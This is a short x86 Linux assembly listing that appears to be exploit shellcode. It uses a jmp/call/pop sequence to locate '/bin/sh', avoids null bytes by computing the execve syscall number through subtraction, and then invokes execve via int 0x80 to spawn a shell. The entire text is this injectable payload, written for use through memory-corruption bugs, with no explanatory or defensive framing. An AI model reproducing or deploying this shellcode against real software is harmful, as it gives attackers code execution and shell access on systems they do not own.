
	jmp _WANT_BIN_BASH
_GOT_BIN_BASH:
	mov eax , 0x1111111c	# for cancelling null bytes. 
	sub eax , 0x11111111	# the result should save 0x0b  in eax.
	pop ebx
	xor ecx , ecx		#pass ecx and edx as null
	mov [ebx+7] , ecx
	xor edx, edx
	int 0x80
	
	
_WANT_BIN_BASH:
	call _GOT_BIN_BASH
	.ascii "/bin/sh@"
	
